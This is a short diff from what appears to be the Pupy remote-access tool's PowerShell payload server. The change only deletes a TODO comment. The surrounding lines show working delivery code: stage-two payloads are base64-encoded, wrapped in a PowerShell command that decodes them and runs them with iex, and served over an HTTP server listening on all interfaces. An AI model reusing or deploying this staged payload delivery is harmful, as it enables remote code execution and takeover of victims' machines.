@@ -156,8 +156,6 @@ def serve_ps1_payload(conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>", useTar
         stage2_x86 = "$code=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{0}'));iex $code;".format(b64encode(stage2_x86))
         stage2_x64 = "$code=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{0}'));iex $code;".format(b64encode(stage2_x64))
         
-        # TO DO create file in a tmp dir and remove it
-
         try:
             server = ThreadedHTTPServer((ip, port),PupyPayloadHTTPHandler)
             server.set(conf, sslEnabled, stage1, stage2_x86, stage2_x64)
